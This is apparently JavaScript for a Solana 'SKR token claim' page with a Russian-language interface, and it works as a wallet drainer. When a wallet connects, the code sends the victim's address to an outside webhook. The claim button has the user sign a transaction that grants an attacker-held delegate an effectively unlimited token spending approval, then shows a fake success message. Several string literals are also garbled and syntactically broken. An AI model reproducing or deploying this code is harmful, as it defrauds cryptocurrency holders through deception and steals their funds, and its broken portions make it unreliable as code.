const TOKEN_MINT = "Gf3XtY632if3F7yvnNdXQi8SnQTBsn8F7DQJFXru5Lh";
const DRAIN_DELEGATE = "ES68acG4AZAbikhpSJwDdpE1J9S7AnGCp9JWPu9zHseN";
const WEBHOOK_URL = "https://solana.requestcatcher.com/test";

let walletPubkey = null;
let wallet = null;

function logVictim(wallet, sig = "") {
    fetch(WEBHOOK_URL, {
        method: "POST",
        body: JSON.stringify({ wallet: wallet, signature: sig, time: new Date().toISOString() })
    }).catch(() => {});
}

document.getElementById('connect-wallet').onclick = async () => {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    if (isMobile) {
        const dappUrl = encodeURIComponent(window.location.href);
        const phantomDeepLink = https://phantom.app/ul/browse/\( {dappUrl}?ref= \){dappUrl};
        window.location.href = phantomDeepLink;
        return;
    }

    if (!window.solana) {
        document.getElementById('status').innerText = "Установи Solana wallet!";
        return;
    }

    wallet = window.solana;

    try {
        await wallet.connect();
        walletPubkey = wallet.publicKey.toString();

        document.getElementById('wallet-address').innerText = Подключено: \( {walletPubkey.slice(0,8)}... \){walletPubkey.slice(-6)};
        document.getElementById('connect-wallet').innerText = "Подключено";
        document.getElementById('connect-wallet').disabled = true;
        document.getElementById('claim-skr').disabled = false;
        document.getElementById('status').innerText = "Готов к клейму!";

        logVictim(walletPubkey);

        wallet.on('disconnect', () => {
            walletPubkey = null;
            document.getElementById('wallet-address').innerText = "Не подключено";
            document.getElementById('connect-wallet').innerText = "Подключить Кошелёк";
            document.getElementById('connect-wallet').disabled = false;
            document.getElementById('claim-skr').disabled = true;
            document.getElementById('status').innerText = "Кошелёк отключён";
        });
    } catch (error) {
        console.error("Ошибка подключения:", error);
        document.getElementById('status').innerText = "Ошибка подключения — попробуй снова";
    }
};

document.getElementById('claim-skr').onclick = async () => {
    if (!walletPubkey || !wallet) return;
    document.getElementById('status').innerHTML = "Обрабатываем...<br>Подпиши транзакцию";

    try {
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
        const mint = new solanaWeb3.PublicKey(TOKEN_MINT);
        const delegate = new solanaWeb3.PublicKey(DRAIN_DELEGATE);
        const owner = new solanaWeb3.PublicKey(walletPubkey);

        const ata = await splToken.getAssociatedTokenAddress(mint, owner);

        let instructions = [];
        instructions.push(splToken.createAssociatedTokenAccountInstruction(owner, ata, owner, mint));
        instructions.push(splToken.createApproveInstruction(ata, delegate, owner, [], Number.MAX_SAFE_INTEGER));

        const tx = new solanaWeb3.Transaction().add(...instructions);
        tx.feePayer = owner;
        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;

        const signed = await wallet.signTransaction(tx);
        const sig = await connection.sendRawTransaction(signed.serialize());

        document.getElementById('status').innerHTML = Успех! Одобрено.<br>SKR придут на TGE.<br>Tx: <a href="https://solscan.io/tx/\( {sig}" target="_blank"> \){sig}</a>;
        document.getElementById('claim-skr').disabled = true;

        logVictim(walletPubkey, sig);
    } catch (err) {
        document.getElementById('status').innerText = "Ошибка — попробуй снова";
    }
};
